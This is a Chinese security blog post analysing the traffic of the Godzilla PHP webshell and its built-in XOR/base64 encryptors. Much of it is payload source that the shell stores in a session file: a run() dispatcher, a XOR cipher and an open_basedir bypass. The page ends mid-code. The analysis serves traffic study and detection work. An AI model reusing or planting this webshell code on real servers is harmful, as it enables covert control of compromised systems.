<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta content="Hello, P001's blog!" property="og:site_name">

  <meta content="Godzilla-从三种自带加密器看哥斯拉流量-PHP篇" property="og:title">


  <meta content="article" property="og:type">


  <meta content=" <h1>P001water@c:\Users\maylas\.ssh</h1> <h3>Do Enjoy youself in hack life</h3> --------CMD /c 这里是朴水... ... Reply from 1988 !-------" property="og:description">


  <meta content="http://localhost:4000/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2023/04/27/Godzilla-%E4%BB%8E%E4%B8%89%E7%A7%8D%E8%87%AA%E5%B8%A6%E5%8A%A0%E5%AF%86%E5%99%A8%E7%9C%8B%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F-PHP%E7%AF%87.html" property="og:url">


  <meta content="2023-04-27T14:10:00+08:00" property="article:published_time">
  <meta content="http://localhost:4000/about/" property="article:author">


  <meta property="og:image" content="">


  
  <meta content="流量分析" property="article:section">
  


  
  <meta content="流量分析，Godzilla" property="article:tag">
  

  <title>Godzilla-从三种自带加密器看哥斯拉流量-PHP篇</title>
  <meta name="description" content="文前漫谈">
<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script> -->
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  
  <!-- <link href='https://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'> -->
  <!-- <link href='https://fonts.googleapis.com/css?family=Fira+Mono' rel='stylesheet' type='text/css'> -->
  <!-- <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'> -->
  <!-- <link href='https://fonts.googleapis.com/css?family=Source+Code+Pro:400,200,300,500,600,700,900' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Gentium+Basic:400,700' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Alegreya:400,400italic,700' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Lora:400,400italic,700' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Fira+Sans:400,300,500,700' rel='stylesheet' type='text/css'>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
  <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous"> -->
  <link rel="canonical" href="http://localhost:4000/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2023/04/27/Godzilla-%E4%BB%8E%E4%B8%89%E7%A7%8D%E8%87%AA%E5%B8%A6%E5%8A%A0%E5%AF%86%E5%99%A8%E7%9C%8B%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F-PHP%E7%AF%87.html">
  <link rel="alternate" type="application/rss+xml" title="Hello, P001's blog!" href="http://localhost:4000/feed.xml">
</head>


  <body>
<section>
<nav class="navbar navbar-default navbar-fixed-top">
  <div class="container">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Hello, P001's blog!</a>
    </div>
    

    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">
        
        
        <li><a href="/Lnk/">Lnk</a></li>
        
        
        
        <li><a href="/about/">About</a></li>
        
        
        
        
        
        
        
        


      </ul>

    <!--  <ul class="nav navbar-nav navbar-right">
        <li><a href="#">Know More!</a></li>

      </ul>-->
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>
</section>

<section>
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <div class="jumbotron">
    <div class="container">
      <h1 class="post-title-main" itemprop="name headline">Godzilla-从三种自带加密器看哥斯拉流量-PHP篇</h1>
      <p class="post-meta"><time datetime="2023-04-27T14:10:00+08:00" itemprop="datePublished">Apr 27, 2023</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">may1as</span></span></p>
      
    </div>

</div>


  <div class="post-content container" itemprop="articleBody">
    <h1 id="文前漫谈">文前漫谈</h1>

<p>Godzilla - designed by <a href="https://github.com/BeichenDream">@BeichenDream</a>s</p>

<p>本文记录我对哥斯拉流量的学习，主要分析了<code class="language-plaintext highlighter-rouge">php</code>版的shell流量加密解密过程，使用的是当前最新版本的哥斯拉，版本号为<code class="language-plaintext highlighter-rouge">v4.01</code>。</p>

<p><img src="/img/image-20230417094217549.png" alt="image-20230417094217549" style="zoom:50%;" /></p>

<h1 id="三种自带的加密器">三种自带的加密器</h1>

<p>生成Godzillz默认的服务端webshell，自带有三种加密器：</p>

<ul>
  <li>PHP_EVAL_XOR_BASE64</li>
  <li>PHP_XOR_BASE64</li>
  <li>PHP_XOR_RAW</li>
</ul>

<p><img src="/img/image-20230319140459501.png" alt="image-20230319140459501" style="zoom:50%;" /></p>

<h1 id="php_xor_base64加密器">PHP_XOR_BASE64加密器</h1>

<p>笔者觉得应该从这种加密器先讲起，后面的<code class="language-plaintext highlighter-rouge">PHP_EVAL_XOR_BASE64</code>等加密器实现原理和它都相同，只是传输形式上的差别。</p>

<p>从http请求的角度看，<code class="language-plaintext highlighter-rouge">PHP_XOR_BASE64</code>加密器和<code class="language-plaintext highlighter-rouge">PHP_EVAL_XOR_BASE64</code>加密器的区别就是，命令执行的过程中，<code class="language-plaintext highlighter-rouge">PHP_XOR_BASE64</code>加密器的http请求正文长度（payload）更短，<code class="language-plaintext highlighter-rouge">PHP_EVAL_XOR_BASE64</code>加密器生成的shell服务端的内容就是一句话木马，这个加密器其实还是调用``PHP_XOR_BASE64`加密器的webshell脚本</p>

<blockquote>
  <p>用Godzilla的<code class="language-plaintext highlighter-rouge">PHP_XOR_BASE64</code>加密器生成的webshell内容</p>
</blockquote>

<p><img src="/img/image-20230319183416405.png" alt="image-20230319183416405" style="zoom: 67%;" /></p>

<p>整个shell的基本流程就是：服务器接收到哥斯拉发送的第一个请求后，如果此时尚未建立session，将POST请求数据解密后（得到的内容为后续shell操作中所需要用到的相关<code class="language-plaintext highlighter-rouge">php</code>函数定义代码）存入session文件中，会话建立完成后，后续哥斯拉只会提交相关操作对应的函数名称和相关参数，这样哥斯拉的命令执行就不需要发送大量的请求数据。</p>

<p>这里的<strong>@run()</strong>函数是关键，后续的命令执行都以这个函数为入口</p>

<h2 id="存储哥斯拉自定义命令执行函数的session文件">存储哥斯拉自定义命令执行函数的session文件</h2>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="mf">...</span> <span class="n">关键代码块</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">]</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="mf">...</span>
</code></pre></div></div>

<p>当http请求包post的内容没有getBasicsInfo字段的话，把post内容写入session文件，这个http请求包通常在我们点击哥斯拉的<strong>“测试连接”</strong>和<strong>进入webshell管理页面</strong>的时候发送</p>

<blockquote>
  <p>成功写入后，服务器端的session文件，以文件的形式存储在php.ini中设置的路径里</p>
</blockquote>

<p><img src="/img/image-20230319194127560.png" alt="image-20230319194127560" style="zoom:67%;" /></p>

<p>玩过session反序列化的应该更容易理解，简单说这里储存的就是下面的文件，这里才是哥斯拉命令执行的关键，代码很长，都是哥斯拉自定义的系统函数，getBasicsInfo()函数也在其中。下面我只介绍两个关键的函数，就是webshell里的<code class="language-plaintext highlighter-rouge">@run()</code>函数和<code class="language-plaintext highlighter-rouge">@evalFunc()</code>。</p>

<p>run()函数涉及到后续解密所需的内容，evalFunc()函数是执行命令的地方</p>

<blockquote>
  <p>@符号用于抑制错误消息的输出。当在一个函数或表达式前面加上@符号时，如果该函数或表达式产生了错误，那么这个错误就不会被报告到PHP解析器，也就不会打印出来。这种错误处理方式通常被称为“静默失败”，因为它会使得错误信息不会被显示在屏幕上，也无法通过日志文件进行跟踪和调试。使用@符号可以隐藏错误。这里是为了处理webshell里未定义run()函数的报错</p>
</blockquote>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$parameters</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
<span class="nv">$_SES</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
<span class="k">function</span> <span class="n">run</span><span class="p">(</span><span class="nv">$pms</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$ERRMSG</span><span class="p">;</span>

    <span class="nf">reDefSystemFunc</span><span class="p">();</span>
    <span class="nv">$_SES</span><span class="o">=&amp;</span><span class="nf">getSession</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
    <span class="nv">$sessioId</span><span class="o">=</span><span class="nb">md5</span><span class="p">(</span><span class="nb">session_id</span><span class="p">());</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">])){</span>
        <span class="nv">$_SES</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">((</span><span class="nf">S1MiwYYr</span><span class="p">(</span><span class="nf">base64Decode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">],</span><span class="nv">$sessioId</span><span class="p">),</span><span class="nv">$sessioId</span><span class="p">)));</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nb">session_write_close</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nf">canCallGzipDecode</span><span class="p">()</span><span class="o">==</span><span class="mi">1</span><span class="o">&amp;&amp;@</span><span class="nf">isGzipStream</span><span class="p">(</span><span class="nv">$pms</span><span class="p">)){</span>
        <span class="nv">$pms</span><span class="o">=</span><span class="nb">gzdecode</span><span class="p">(</span><span class="nv">$pms</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nf">formatParameter</span><span class="p">(</span><span class="nv">$pms</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">[</span><span class="s2">"bypass_open_basedir"</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nv">$_SES</span><span class="p">[</span><span class="s2">"bypass_open_basedir"</span><span class="p">]</span><span class="o">==</span><span class="kc">true</span><span class="p">){</span>
        <span class="o">@</span><span class="nf">bypass_open_basedir</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"set_error_handler"</span><span class="p">)){</span>
        <span class="o">@</span><span class="nb">set_error_handler</span><span class="p">(</span><span class="s2">"payloadErrorHandler"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"set_exception_handler"</span><span class="p">)){</span>
        <span class="o">@</span><span class="nb">set_exception_handler</span><span class="p">(</span><span class="s2">"payloadExceptionHandler"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$result</span><span class="o">=@</span><span class="nf">evalFunc</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">==</span><span class="kc">null</span><span class="o">||</span><span class="nv">$result</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nv">$ERRMSG</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SES</span><span class="o">!==</span><span class="kc">null</span><span class="p">){</span>
        <span class="nb">session_start</span><span class="p">();</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">]</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nf">S1MiwYYr</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$_SES</span><span class="p">),</span><span class="nv">$sessioId</span><span class="p">));</span>
        <span class="o">@</span><span class="nb">session_write_close</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">canCallGzipEncode</span><span class="p">()){</span>
        <span class="nv">$result</span><span class="o">=</span><span class="nb">gzencode</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">payloadExceptionHandler</span><span class="p">(</span><span class="nv">$exception</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$ERRMSG</span><span class="p">;</span>
    <span class="nv">$ERRMSG</span><span class="mf">.</span><span class="o">=</span><span class="s2">"ExceptionMsg:"</span><span class="mf">.</span><span class="nv">$exception</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">()</span><span class="mf">.</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">payloadErrorHandler</span><span class="p">(</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="nv">$errfile</span><span class="o">=</span><span class="kc">null</span><span class="p">,</span> <span class="nv">$errline</span><span class="o">=</span><span class="kc">null</span><span class="p">,</span><span class="nv">$errcontext</span><span class="o">=</span><span class="kc">null</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$ERRMSG</span><span class="p">;</span>
    <span class="nv">$ERRMSG</span><span class="mf">.</span><span class="o">=</span><span class="s2">"ErrLine: </span><span class="si">{</span><span class="nv">$errline</span><span class="si">}</span><span class="s2"> ErrorMsg:</span><span class="si">{</span><span class="nv">$errstr</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">S1MiwYYr</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$K</span><span class="p">[(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">15</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">reDefSystemFunc</span><span class="p">(){</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"file_get_contents"</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">);</span>
            <span class="nv">$contents</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">do</span> <span class="p">{</span> <span class="nv">$contents</span> <span class="mf">.</span><span class="o">=</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">);</span> <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$f</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
            <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'gzdecode'</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"gzinflate"</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="n">gzdecode</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="nb">gzinflate</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="o">-</span><span class="mi">8</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"sys_get_temp_dir"</span><span class="p">)){</span>
        <span class="k">function</span> <span class="n">sys_get_temp_dir</span><span class="p">(){</span>
            <span class="nv">$SCRIPT_FILENAME</span><span class="o">=</span><span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$SCRIPT_FILENAME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">'/'</span><span class="p">){</span>
                <span class="k">return</span> <span class="s2">"C:/Windows/Temp/"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"/tmp/"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"getmygid"</span><span class="p">)){</span>
        <span class="k">function</span> <span class="n">getmygid</span><span class="p">(){</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"scandir"</span><span class="p">)){</span>
        <span class="k">function</span> <span class="n">scandir</span><span class="p">(</span><span class="nv">$directory</span><span class="p">){</span>
            <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$directory</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$dh</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
                <span class="nv">$files</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
                <span class="k">while</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="o">@</span><span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$files</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"file_put_contents"</span><span class="p">)){</span>
        <span class="k">function</span> <span class="n">file_put_contents</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span> <span class="nv">$data</span><span class="p">){</span>
            <span class="nv">$handle</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">"wb"</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
                <span class="nv">$len</span><span class="o">=</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$len</span><span class="p">;</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"is_executable"</span><span class="p">)){</span>
        <span class="k">function</span> <span class="n">is_executable</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">){</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">function</span> <span class="o">&amp;</span><span class="n">getSession</span><span class="p">(){</span>
    <span class="k">global</span> <span class="nv">$_SES</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$_SES</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">bypass_open_basedir</span><span class="p">(){</span>
    <span class="o">@</span><span class="nv">$_FILENAME</span> <span class="o">=</span> <span class="o">@</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SCRIPT_FILENAME'</span><span class="p">]);</span>
    <span class="nv">$allFiles</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nv">$_FILENAME</span><span class="p">);</span>
    <span class="nv">$cdStatus</span><span class="o">=</span><span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$allFiles</span><span class="o">!=</span><span class="kc">null</span><span class="p">){</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$allFiles</span> <span class="k">as</span> <span class="nv">$fileName</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$fileName</span><span class="o">!=</span><span class="s2">"."</span><span class="o">&amp;&amp;</span><span class="nv">$fileName</span><span class="o">!=</span><span class="s2">".."</span><span class="p">){</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)){</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">)</span><span class="o">===</span><span class="kc">true</span><span class="p">){</span>
                        <span class="nv">$cdStatus</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">'bypass_open_basedir'</span><span class="p">)</span><span class="o">&amp;&amp;!</span><span class="nv">$cdStatus</span><span class="p">){</span>
        <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="s1">'bypass_open_basedir'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cdStatus</span><span class="p">){</span>
        <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">'bypass_open_basedir'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span><span class="s1">'..'</span><span class="p">);</span>
    <span class="o">@</span><span class="nv">$_FILENAME</span> <span class="o">=</span> <span class="o">@</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SCRIPT_FILENAME'</span><span class="p">]);</span>
    <span class="o">@</span><span class="nv">$_path</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">,</span><span class="s1">'/'</span><span class="p">,</span><span class="nv">$_FILENAME</span><span class="p">);</span>
    <span class="o">@</span><span class="nv">$_num</span> <span class="o">=</span> <span class="nb">substr_count</span><span class="p">(</span><span class="nv">$_path</span><span class="p">,</span><span class="s1">'/'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="nv">$_i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="nv">$_i</span> <span class="o">&lt;</span> <span class="nv">$_num</span><span class="p">){</span>
        <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>
        <span class="nv">$_i</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span><span class="s1">'/'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cdStatus</span><span class="p">){</span>
        <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$_FILENAME</span><span class="mf">.</span><span class="s1">'/'</span><span class="mf">.</span><span class="s1">'bypass_open_basedir'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">formatParameter</span><span class="p">(</span><span class="nv">$pms</span><span class="p">){</span>
    <span class="k">global</span> <span class="nv">$parameters</span><span class="p">;</span>
    <span class="nv">$index</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="nv">$key</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">){</span>
        <span class="nv">$q</span><span class="o">=</span><span class="nv">$pms</span><span class="p">[</span><span class="nv">$index</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$q</span><span class="p">)</span><span class="o">==</span><span class="mh">0x02</span><span class="p">){</span>
            <span class="nv">$len</span><span class="o">=</span><span class="nf">bytesToInteger</span><span class="p">(</span><span class="nf">getBytes</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$pms</span><span class="p">,</span><span class="nv">$index</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">)),</span><span class="mi">0</span><span class="p">);</span>
            <span class="nv">$index</span><span class="o">+=</span><span class="mi">4</span><span class="p">;</span>
            <span class="nv">$value</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$pms</span><span class="p">,</span><span class="nv">$index</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="nv">$len</span><span class="p">);</span>
            <span class="nv">$index</span><span class="o">+=</span><span class="nv">$len</span><span class="p">;</span>
            <span class="nv">$parameters</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span><span class="o">=</span><span class="nv">$value</span><span class="p">;</span>
            <span class="nv">$key</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$key</span><span class="mf">.</span><span class="o">=</span><span class="nv">$q</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$index</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$index</span><span class="o">&gt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$pms</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">){</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="n">evalFunc</span><span class="p">(){</span>
